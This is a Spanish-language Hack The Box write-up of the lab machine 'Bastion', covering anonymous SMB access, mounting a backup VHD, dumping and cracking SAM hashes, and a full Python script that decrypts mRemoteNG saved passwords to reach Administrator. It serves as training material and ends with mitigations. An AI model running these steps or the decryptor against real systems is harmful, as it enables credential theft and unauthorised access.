# 🏰 Bastion — WriteUp HTB

> **Plataforma:** Hack The Box  
> **Dificultad:** Fácil  
> **SO:** Windows  
> **Fecha de lanzamiento:** 27 Apr 2019  
> **Fecha de retiro:** 07 Sep 2019  
> **Creador:** L4mpje

---

## 📑 Índice

1. [Introducción](#introducción)
2. [Reconocimiento](#reconocimiento)
3. [Enumeración SMB](#enumeración-smb)
4. [Recurso Compartido Backups](#recurso-compartido-backups)
5. [Montar el VHD](#montar-el-vhd)
6. [Shell como l4mpje](#shell-como-l4mpje)
7. [Escalada de Privilegios a Administrador](#escalada-de-privilegios-a-administrador)
8. [SSH como Administrador](#ssh-como-administrador)

---

## 📌 Introducción

Bastion es una máquina sólida de dificultad fácil que presenta algunos retos muy interesantes y poco habituales: montar un **VHD (Virtual Hard Disk)** desde un recurso compartido SMB y recuperar contraseñas de un gestor de conexiones remotas llamado **mRemoteNG**.

La máquina comienza de forma algo inusual, ya que no hay ningún sitio web expuesto. El vector de entrada es un recurso compartido SMB que contiene imágenes de disco virtual. Una vez montadas, tendremos acceso a los archivos del registro de Windows, lo que nos permitirá extraer hashes de contraseñas. Crackeando esos hashes obtendremos acceso SSH como usuario. Para escalar a administrador, explotaremos el gestor de conexiones mRemoteNG, que guarda las contraseñas cifradas en un archivo de configuración que podremos descifrar.

---

## 🔎 Reconocimiento

### 🌐 nmap — Descubrimiento de puertos

Como siempre, comenzamos con un escaneo de puertos con **nmap**. Primero escaneamos todos los puertos TCP:

```bash
nmap -sT -p- --min-rate 10000 -oA nmap/nmap-alltcp 10.129.136.29
```

**Explicación de los flags:**
- `-sT` → Escaneo TCP connect (más compatible con ciertos entornos y proxies)
- `-p-` → Escanear los 65535 puertos TCP
- `--min-rate 10000` → Enviar al menos 10.000 paquetes por segundo para mayor velocidad
- `-oA nmap/nmap-alltcp` → Guardar los resultados en todos los formatos disponibles

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 01:39 EDT
Nmap scan report for 10.129.136.29
Host is up (0.10s latency).
Not shown: 65450 filtered ports, 81 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
```
![](/Images/bastion1.png)<br>

Una vez identificados los puertos abiertos, lanzamos un segundo escaneo para detectar **versiones de servicios y ejecutar scripts de detección**:

```bash
nmap -sC -sV -p 22,135,139,445 -oA nmap/nmap-tcpscripts 10.129.136.29
```

**Flags adicionales:**
- `-sC` → Ejecutar los scripts de detección por defecto de nmap
- `-sV` → Detectar versiones de los servicios en cada puerto

```
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -45m33s, deviation: 1h09m14s, median: -5m35s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-05-03T07:35:01+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-05-03 01:34:59
|_  start_date: 2019-05-01 23:10:38

Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds
```

![](/Images/bastion2.png)<br>

De este escaneo extraemos información muy valiosa:

- **Sistema operativo:** Windows Server 2016 Standard (build 14393)
- **Nombre del equipo:** Bastion
- **Workgroup:** WORKGROUP (no es un dominio, sino un grupo de trabajo — a diferencia de la máquina Active, aquí no hay Active Directory)
- **Puerto 22 (SSH):** Ver SSH en una máquina Windows es llamativo. Normalmente se usa RDP (3389) para acceso remoto en Windows, pero aquí han instalado OpenSSH, lo que nos da un vector de acceso muy cómodo si obtenemos credenciales.
- **SMB signing desactivado:** Esto podría permitir ataques de relay SMB, aunque no será necesario en esta máquina.

> 💡 **¿Por qué no hay puerto 3268 (Global Catalog) ni 88 (Kerberos)?**  
> A diferencia de la máquina Active, aquí no hay Active Directory. La máquina pertenece a un `WORKGROUP`, que es simplemente un agrupamiento básico sin servidor de autenticación centralizado. Esto significa que no podremos hacer Kerberoasting, pero sí extraer hashes locales del SAM.

---

## 📂 Enumeración SMB

### 📋 Listado de recursos compartidos

Usamos `smbclient` con el flag `-N` (sin contraseña) para listar los recursos compartidos disponibles de forma anónima:

```bash
smbclient -N -L //10.129.136.29
```

**Explicación:**
- `-N` → No pedir contraseña (acceso anónimo/null session)
- `-L` → Listar recursos compartidos disponibles

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.136.29 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

![](/Images/bastion3.png)<br>

Vemos cuatro recursos compartidos. Los más interesantes son:
- **`Backups`** → Un recurso no estándar, probablemente con contenido jugoso
- **`ADMIN$`** y **`C$`** → Solo accesibles para administradores
- **`IPC$`** → Canal de comunicación entre procesos, usado para enumerar

El recurso **`Backups`** es claramente el vector de entrada. Vamos a explorarlo.

---

## 💾 Recurso Compartido Backups

### 🔍 Exploración inicial

Nos conectamos al recurso `Backups` de forma anónima:

```bash
smbclient -N //10.129.136.29/backups
```

```
smb: \> ls
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

                7735807 blocks of size 4096. 2786156 blocks available
```

![](/Images/bastion4.png)<br>

Encontramos dos archivos y un directorio. El directorio `WindowsImageBackup` es especialmente interesante — es el nombre estándar que usa la herramienta de copia de seguridad integrada de Windows.

Primero revisamos `note.txt`:

```
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

![](/Images/bastion5.png)<br>

La nota dice que no copiemos el archivo de backup localmente porque el VPN es lento. Eso nos da una pista importante: **en lugar de descargar los archivos, vamos a montar el recurso compartido directamente en nuestro sistema de archivos**. Así accedemos a los datos sin necesidad de transferirlos.

### 🔗 Montar el recurso SMB en Linux

Montamos el recurso compartido usando el protocolo CIFS:

```bash
mount -t cifs //10.129.136.29/backups /mnt -o user=,password=
```

**Explicación:**
- `mount -t cifs` → Montar un recurso compartido con el protocolo CIFS (Common Internet File System), que es la implementación moderna de SMB
- `-o user=,password=` → Credenciales vacías para acceso anónimo

```bash
ls /mnt/
note.txt  SDT65CB.tmp  WindowsImageBackup
```

![](/Images/bastion6.png)<br>

Ahora listamos todos los archivos recursivamente para ver qué hay dentro:

```bash
find /mnt/ -type f
```

```
/mnt/note.txt
/mnt/SDT65CB.tmp
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/BackupSpecs.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/BackupGlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/GlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/MediaId
/mnt/WindowsImageBackup/L4mpje-PC/SPPMetadataCache/{cd113385-65ff-4ea2-8ced-5630f6feca8f}
```

Lo más importante son los dos archivos `.vhd`:
- `9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd`
- `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd`

![](/Images/bastion7.png)<br>

> 💡 **¿Qué es un VHD?**  
> Un **VHD (Virtual Hard Disk)** es un formato de archivo que representa un disco duro completo de forma virtual. Se usa principalmente en máquinas virtuales (Hyper-V, VirtualBox) y en las copias de seguridad de Windows. Contiene exactamente lo mismo que un disco físico: sistema de archivos, particiones, archivos del sistema, etc. En este caso, es una copia de seguridad del PC del usuario `L4mpje`.

---

## 🧩 Montar el VHD

### 📥 Instalación de guestmount

Para montar archivos VHD en Linux necesitamos la herramienta `guestmount`, parte del paquete `libguestfs-tools`:

```bash
apt install libguestfs-tools
```

> 💡 **¿Qué es guestmount?**  
> `guestmount` es una herramienta que permite montar imágenes de disco virtual de múltiples formatos (VHD, VMDK, QCOW2, etc.) directamente en el sistema de archivos de Linux, sin necesidad de una máquina virtual. Es especialmente útil en forense y pentesting para acceder al contenido de backups o imágenes de máquinas virtuales.

### ❌ Intento con el primer VHD

Creamos el directorio donde montaremos la imagen y probamos con el primer archivo:

```bash
sudo mkdir -p /mnt2
guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
```

**Explicación de los flags:**
- `--add` → Especificar la imagen de disco a montar
- `--inspector` → Detectar automáticamente el sistema operativo y los sistemas de archivos dentro de la imagen
- `--ro` → Montar en modo solo lectura (read-only), para no modificar nada

```
guestmount: no operating system was found on this disk
```

![](/Images/bastion8.png)<br>

El primer VHD falla porque no contiene un sistema operativo. En los backups de Windows creados con la herramienta nativa, habitualmente el primer VHD es la partición de sistema reservada (System Reserved), que contiene el bootloader pero no los archivos del sistema completos.

### ✅ Éxito con el segundo VHD

Probamos con el segundo archivo:

```bash
guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
ls /mnt2/
```

```
'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows
```

![](/Images/bastion9.png)<br>

¡Perfecto! El segundo VHD contiene la partición principal de Windows con todo el sistema de archivos. Tenemos acceso completo como si fuera un disco duro físico extraído del equipo.

---

## 💻 Shell como l4mpje

### 🔐 Extraer Hashes del Registro de Windows

Con acceso completo al sistema de archivos, podemos acceder a los **archivos del registro** de Windows. El registro es una base de datos jerárquica donde Windows almacena la configuración del sistema, incluyendo (en forma de hashes) las contraseñas de los usuarios locales.

> 💡 **¿Qué son los Registry Hives?**  
> Los "hives" o colmenas del registro son los archivos físicos donde se almacena el registro de Windows. Los más importantes para nosotros están en `C:\Windows\System32\config\`:
> - **SAM (Security Account Manager):** Contiene los hashes NTLM de las contraseñas de los usuarios locales.
> - **SYSTEM:** Contiene la clave de arranque del sistema (bootKey) necesaria para descifrar el SAM.
> - **SECURITY:** Contiene secretos LSA, caché de credenciales de dominio, y contraseñas de autologin.
>
> Cuando el sistema está en ejecución, estos archivos están bloqueados por el kernel de Windows y no se pueden copiar directamente. Sin embargo, en una imagen de disco montada (offline), no hay ningún bloqueo, por lo que podemos acceder a ellos libremente.

Nos situamos en el directorio de configuración del registro y usamos `impacket-secretsdump` para extraer los hashes:

```bash
cd /mnt2/Windows/System32/config
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

**Explicación:**
- `-sam SAM` → Archivo SAM (hashes de usuarios locales)
- `-security SECURITY` → Archivo SECURITY (secretos LSA, credenciales cacheadas)
- `-system SYSTEM` → Archivo SYSTEM (clave de arranque para descifrar el SAM)
- `LOCAL` → Indica que estamos trabajando con archivos locales, no contra un objetivo remoto

```
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:e4487d0421e6611a364a5028467e053c:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up...
```

![](/Images/bastion10.png)<br>

> 💡 **Formato de los hashes en el SAM:**  
> El formato es `usuario:RID:LM_hash:NT_hash`. El campo `aad3b435b51404eeaad3b435b51404ee` que aparece en el LM hash es el hash vacío de LM (indica que LM está desactivado, lo cual es lo normal en sistemas modernos). El hash que nos interesa crackear es el **NT hash** (el cuarto campo).
>
> - `Administrator` → Hash NT: `31d6cfe0d16ae931b73c59d7e0c089c0` (hash de contraseña vacía — la cuenta está desactivada o sin contraseña en este backup)
> - `L4mpje` → Hash NT: `26112010952d963c8dc4217daec986d9` ← **Este es el que vamos a crackear**

Además, `impacket-secretsdump` identificó una **contraseña de inicio de sesión automático** (`DefaultPassword`) con el valor `bureaulampje` para un usuario desconocido. Esta es la contraseña almacenada en el registro para el autologon de Windows.

### 🔓 Crackear el Hash

Enviamos el hash NT de `L4mpje` a **CrackStation** (https://crackstation.net), un servicio online de crackeo de hashes por tablas arcoíris:

```
26112010952d963c8dc4217daec986d9 → bureaulampje
```
![](/Images/bastion11.png)<br>

La contraseña crackeada coincide con la contraseña de autologon que ya encontramos. Esto confirma que el usuario `L4mpje` usa la contraseña `bureaulampje`.

> 💡 **¿Qué es el crackeo por tablas arcoíris?**  
> Las tablas arcoíris (rainbow tables) son bases de datos precalculadas que relacionan hashes con sus contraseñas originales. CrackStation tiene tablas con miles de millones de hashes precalculados, lo que permite encontrar contraseñas comunes de forma casi instantánea sin necesidad de calcular nada en tiempo real.

### 🚪 Acceso por SSH

Ahora usamos las credenciales obtenidas para conectarnos por SSH. Recordemos que el puerto 22 estaba abierto con OpenSSH para Windows:

```bash
ssh L4mpje@10.129.136.29
```

```
L4mpje@10.129.136.29's password: bureaulampje

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>
```

![](/Images/bastion12.png)<br>

Obtenemos la flag de usuario:

```
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
9bfe57d5...
```

![](/Images/bastion13.png)<br>

✅ **¡Flag de usuario conseguida!**

---

## ⬆️ Escalada de Privilegios a Administrador

### 🧭 Enumeración de programas instalados

Con acceso como `L4mpje`, comenzamos a enumerar el sistema. Una de las primeras cosas que revisamos son los programas instalados, ya que los gestores de contraseñas, clientes VPN o herramientas de acceso remoto suelen almacenar credenciales de forma local:

```powershell
PS C:\Program Files (x86)> dir
```

```
    Directory: C:\Program Files (x86)

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        16-7-2016     15:23                Common Files
d-----        23-2-2019     09:38                Internet Explorer
d-----        16-7-2016     15:23                Microsoft.NET
da----        22-2-2019     14:01                mRemoteNG
d-----        23-2-2019     10:22                Windows Defender
d-----        23-2-2019     09:38                Windows Mail
d-----        23-2-2019     10:22                Windows Media Player
d-----        16-7-2016     15:23                Windows Multimedia Platform
d-----        16-7-2016     15:23                Windows NT
d-----        23-2-2019     10:22                Windows Photo Viewer
d-----        16-7-2016     15:23                Windows Portable Devices
d-----        16-7-2016     15:23                WindowsPowerShell
```

**`mRemoteNG`** salta a la vista inmediatamente.

![](/Images/bastion14.png)<br>

> 💡 **¿Qué es mRemoteNG?**  
> mRemoteNG (multi-Remote Next Generation) es una herramienta de gestión de conexiones remotas de código abierto para Windows muy popular entre administradores de sistemas. Permite gestionar conexiones RDP, SSH, VNC, Telnet y otros protocolos desde una sola interfaz. Una de sus funcionalidades es guardar las contraseñas de las conexiones de forma cifrada en un archivo XML de configuración. Si conseguimos descifrar esas contraseñas, podríamos obtener credenciales de otros sistemas — o en este caso, del propio administrador de la máquina.

### 📄 Localización del archivo de configuración

mRemoteNG guarda sus perfiles de conexión en el directorio `AppData` del usuario. Navegamos a esa ubicación:

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir
```

```
 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG

22-02-2019  15:03    <DIR>          .
22-02-2019  15:03    <DIR>          ..
22-02-2019  15:03             6.316 confCons.xml
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup
22-02-2019  15:03                51 extApps.xml
22-02-2019  15:03             5.217 mRemoteNG.log
22-02-2019  15:03             2.245 pnlLayout.xml
22-02-2019  15:01    <DIR>          Themes
              14 File(s)         76.577 bytes
               3 Dir(s)  11.383.193.600 bytes free
```

![](/Images/bastion15.png)<br>

Encontramos el archivo `confCons.xml` (el archivo de configuración principal) y varios backups automáticos del mismo. Al examinar su contenido vemos que es un XML con las contraseñas cifradas:

```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="9+/QC0ASX6vyu8eqAnoWf9rAqVvP8vuwonKagk7aY68lTF3pcqbgO0Lcj6E7xUwo6V47gl93CKdDTXKpYt0wOFk6" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" [...] />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" [...] />
</mrng:Connections>
```

![](/Images/bastion16.png)<br>

> 💡 **Análisis del archivo de configuración:**  
> Identificamos dos nodos (conexiones guardadas):
> - **Nodo "DC":** Usuario `Administrator`, host `127.0.0.1` (el propio servidor), protocolo RDP. La contraseña cifrada es `V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/...`
> - **Nodo "L4mpje-PC":** Usuario `L4mpje`, host `192.168.1.75`, protocolo RDP. La contraseña cifrada es `OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/...`
>
> El archivo usa `EncryptionEngine="AES"` con `BlockCipherMode="GCM"`. GCM (Galois/Counter Mode) es un modo de cifrado autenticado que proporciona tanto confidencialidad como integridad.

> ⚠️ **Nota sobre versiones:** Este writeup fue completado cuando la máquina fue publicada. Si al hacer la máquina ves valores diferentes en el XML, es porque el archivo ha sido actualizado posteriormente. Las contraseñas resultantes serán las mismas.

### 🔓 Extracción de las contraseñas

#### Técnicas antiguas y por qué ya no funcionan

Existen varios artículos y el módulo de Metasploit que atacan versiones antiguas de mRemoteNG usando una **clave estática** que el programa usaba para cifrar las contraseñas. A partir de la versión **1.76**, mRemoteNG permite al usuario configurar una contraseña maestra personalizada, y si no se configura ninguna, usa la contraseña por defecto `"mR3m"`. Sin embargo, también cambió el modo de bloque AES (de CBC a GCM), lo que dejó inutilizables a todas las herramientas antiguas que solo conocían la clave pero no el nuevo modo de cifrado.

#### Método: mremoteng-decrypt

Cuando salió Bastion, apareció en GitHub la herramienta `mremoteng-decrypt`. En ese momento solo había una versión en Java. La usamos pasándole directamente cada contraseña cifrada extraída del XML:

```bash
java -jar decipher_mremoteng.jar OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7
```

```
User Input: OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7
Use default password for cracking...
Decrypted Output: bureaulampje
```

```bash
java -jar decipher_mremoteng.jar V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
```

```
User Input: V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
Use default password for cracking...
Decrypted Output: thXLHM96BeKL0ER2
```

![](/Images/bastion17.png)<br>

Resultados:
- **L4mpje** → `bureaulampje` (contraseña que ya conocíamos ✓)
- **Administrator** → `thXLHM96BeKL0ER2` ← **¡Nueva contraseña!**

> 💡 **¿Cómo funciona el descifrado de mRemoteNG?**  
> Las contraseñas en el `confCons.xml` están cifradas con **AES-256 en modo GCM**. La clave se deriva usando **PBKDF2 con SHA1**, a partir de la contraseña maestra (por defecto `"mR3m"`), una sal aleatoria (los primeros 16 bytes del texto cifrado) y 1000 iteraciones. El proceso completo para descifrar es:
> 1. Decodificar el campo `Password` de Base64
> 2. Extraer la sal (bytes 0-15), el nonce (bytes 16-31), el texto cifrado (bytes 32 hasta -16) y el tag de autenticación GCM (últimos 16 bytes)
> 3. Derivar la clave con PBKDF2(SHA1, "mR3m", salt, 1000 iteraciones, 32 bytes)
> 4. Descifrar con AES-GCM usando la clave, el nonce y verificar el tag

También existe un script en Python que automatiza todo este proceso leyendo directamente el archivo `confCons.xml`:

```python
#!/usr/bin/env python3

import base64
import hashlib
import re
import sys
from Cryptodome.Cipher import AES

if len(sys.argv) != 2:
    print(f"[-] Usage: {sys.argv[0]} [confCons.xml]")
    sys.exit()

try:
    with open(sys.argv[1], 'r') as f:
        conf = f.read()
except FileNotFoundError:
    print(f"[-] Unable to open {sys.argv[1]}")
    sys.exit()

mode = re.findall('BlockCipherMode="(\w+)"', conf)
if len(mode) != 1:
    print("[-] Warning - No BlockCipherMode detected")
elif mode[0] != 'GCM':
    print(f"[-] Warning - This script is for AES GCM Mode. {mode} detected")

nodes = re.findall('<Node .+/>', conf)
if len(nodes) > 0:
    print(f"[+] Found nodes: {len(nodes)}\n")
else:
    print("[-] Found no nodes")

for node in nodes:
    user = re.findall(' Username="(\w*)"', node)[0]
    enc = base64.b64decode(re.findall(' Password="([^ ]+)"', node)[0])
    salt = enc[:16]
    nonce = enc[16:32]
    cipher = enc[32:-16]
    tag = enc[-16:]
    key = hashlib.pbkdf2_hmac("sha1", b"mR3m", salt, 1000, dklen=32)
    aes = AES.new(key, AES.MODE_GCM, nonce=nonce)
    aes.update(salt)
    password = aes.decrypt_and_verify(cipher, tag).decode()
    print(f"Username: {user}\nPassword: {password}\n")
```

El script lee el archivo XML, extrae automáticamente todos los nodos con contraseñas y los descifra usando la clave por defecto `"mR3m"`. Ejecutándolo:

```bash
python3 mRemoteNG-decrypt.py confCons.xml
```

```
[+] Found nodes: 2

Username: Administrator
Password: thXLHM96BeKL0ER2

Username: L4mpje
Password: bureaulampje
```

---

## 👑 SSH como Administrador

Con la contraseña del administrador obtenida, nos conectamos por SSH:

```bash
ssh administrator@10.129.136.29
```

```
administrator@10.129.136.29's password: thXLHM96BeKL0ER2

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>
```

Obtenemos la flag de root:

```
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
958850b9...
```

![](/Images/bastion18.png)<br>

✅ **¡Flag de root conseguida!**

---

## 🔗 Resumen de la cadena de ataque

```
Acceso anónimo SMB → Recurso "Backups"
            ↓
    Montar recurso CIFS en /mnt
            ↓
    Encontrar archivos VHD (Windows Image Backup)
            ↓
    Montar VHD con guestmount → Acceso offline al sistema de archivos
            ↓
    Extraer hashes del registro (SAM + SYSTEM + SECURITY)
    con impacket-secretsdump
            ↓
    Crackear hash NTLM de L4mpje → bureaulampje
            ↓
    SSH como L4mpje
            ↓
    Encontrar mRemoteNG instalado
            ↓
    Leer confCons.xml → Contraseñas AES-GCM cifradas
            ↓
    Descifrar con mremoteng-decrypt / script Python
            ↓
    Contraseña Administrator: thXLHM96BeKL0ER2
            ↓
    SSH como Administrator → SYSTEM
```

---

## 📚 Lecciones aprendidas

| Vulnerabilidad | Impacto | Mitigación |
|---|---|---|
| Recurso SMB de backup accesible de forma anónima | Acceso a imagen completa del disco | Proteger los recursos SMB con credenciales; nunca exponer backups sin autenticación |
| Backup de disco completo expuesto en red | Extracción offline del registro y hashes | Cifrar las copias de seguridad con BitLocker o soluciones similares |
| Contraseña débil crackeada desde hash NTLM | Acceso como usuario L4mpje | Usar contraseñas largas y complejas; habilitar protecciones como Credential Guard |
| mRemoteNG con contraseña maestra por defecto | Descifrado trivial de credenciales guardadas | Configurar una contraseña maestra fuerte en mRemoteNG; no guardar credenciales de cuentas privilegiadas |
| Contraseña del Administrador guardada en mRemoteNG | Escalada de privilegios completa | Principio de mínimo privilegio; no guardar credenciales de admin en herramientas de usuario |

---

*WriteUp realizado con fines educativos en el contexto de Hack The Box.*
